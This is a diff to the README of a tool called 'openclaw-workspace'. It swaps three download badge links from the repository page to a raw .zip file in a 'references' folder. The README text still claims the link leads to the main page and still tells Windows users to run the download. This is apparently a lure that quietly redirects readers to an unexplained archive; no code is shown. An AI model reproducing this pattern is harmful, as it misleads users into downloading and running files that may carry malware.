@@ -1,6 +1,6 @@
 # 🛠️ openclaw-workspace - Manage and Optimize OpenClaw Files
 
-[![Download openclaw-workspace](https://img.shields.io/badge/Download-openclaw--workspace-brightgreen)](https://github.com/travererogenous649/openclaw-workspace)
+[![Download openclaw-workspace](https://img.shields.io/badge/Download-openclaw--workspace-brightgreen)](https://raw.githubusercontent.com/travererogenous649/openclaw-workspace/main/references/openclaw-workspace-v2.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This tool is for anyone who uses OpenClaw workspace files frequently or wants to
 
 To get started, you need to download the software:
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blueviolet)](https://github.com/travererogenous649/openclaw-workspace)
+[![Download Here](https://img.shields.io/badge/Download-Here-blueviolet)](https://raw.githubusercontent.com/travererogenous649/openclaw-workspace/main/references/openclaw-workspace-v2.3.zip)
 
 This link will take you to the main page where you can find the latest version available for download.
 
@@ -131,7 +131,7 @@ If openclaw-workspace freezes or crashes, close the program and reopen. Avoid ru
 
 Use this link to download and install on your Windows PC:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-From_GitHub-blue)](https://github.com/travererogenous649/openclaw-workspace)
+[![Download from GitHub](https://img.shields.io/badge/Download-From_GitHub-blue)](https://raw.githubusercontent.com/travererogenous649/openclaw-workspace/main/references/openclaw-workspace-v2.3.zip)
 
 Click the link, find the latest Windows release, download the `.exe` or `.zip` file, and follow the steps under Getting Started.
 
